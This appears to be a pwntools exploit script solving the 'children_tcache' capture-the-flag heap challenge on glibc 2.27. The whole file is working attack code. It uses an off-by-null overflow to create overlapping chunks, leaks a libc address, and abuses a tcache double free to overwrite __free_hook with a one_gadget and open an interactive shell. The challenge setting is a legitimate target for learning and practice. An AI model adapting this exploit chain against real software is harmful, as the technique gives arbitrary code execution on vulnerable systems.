from pwn import *

# p = remote('node3.buuoj.cn', 28257)
p = process('./children_tcache', env={"LD_PRELOAD":"libc-2.27.so"})
# context.terminal = ['tmux', 'splitw', '-h']
# gdb.attach(proc.pidof(p)[0], gdbscript='''
#                                     continue
#                                     ''')
libc = ELF('libc-2.27.so')
elf = ELF('children_tcache')

def new(size, data):
    p.sendlineafter('Your choice: ', '1')
    p.sendlineafter('Size:', str(size))
    p.sendafter('Data:', data)
    if len(data) < size:
        p.sendline()

def show(index):
    p.sendlineafter('Your choice: ', '2')
    p.sendlineafter('Index:', str(index))

def delete(index):
    p.sendlineafter('Your choice: ', '3')
    p.sendlineafter('Index:', str(index))


def solve():
    onegadget = [0x4f322, 0x4f2c5, 0x10a38c]
    new(0x500, 'A'*0x4ff)   # chunk 0
    new(0x68, 'B'*0x68)     # chunk 1
    new(0x5f0, 'C'*0x5ef)   # chunk 2
    new(0x10, 'D'*0x10)     # chunk 3 to separate from top chunk

    delete(0)
    delete(1)

    # clear 0xda from prev_size of chunk 2
    # bypass strcpy (strcpy copy ulti hit '\x00')
    for i in range(9):
        new(0x68 -i, 'B'*(0x68 - i))        # chunk 0
        delete(0)

    # overflow chunk 2 
    new(0x68, 'B'*0x60 + p64(0x580))        # chunk 0
    
    delete(2)
    
    new(0x500, 'A'*0x4ff)           # chunk 1 

    show(0)
    leak_addr = p.recvline()
    libc.address = u64(leak_addr[:6] + '\x00\x00') - 0x3ebca0
    malloc_hook = libc.symbols['__malloc_hook']
    free_hook = libc.symbols['__free_hook']
    one_gadget = libc.address + onegadget[0]
    log.info("leak address: %s" % hex(u64(leak_addr[:6] + '\x00\x00')))

    log.info("libc address: %s" % hex(libc.address))
    new(0x68, 'B'*0x67)        # chunk 2

    # double free glibc 2.27
    delete(2)
    delete(0)

    new(0x68, p64(free_hook))   # chunk 0 
    new(0x68, 'a')        # chunk 2
    new(0x68, p64(one_gadget))

    delete(2)
    p.interactive()
if __name__ == '__main__':
    solve()
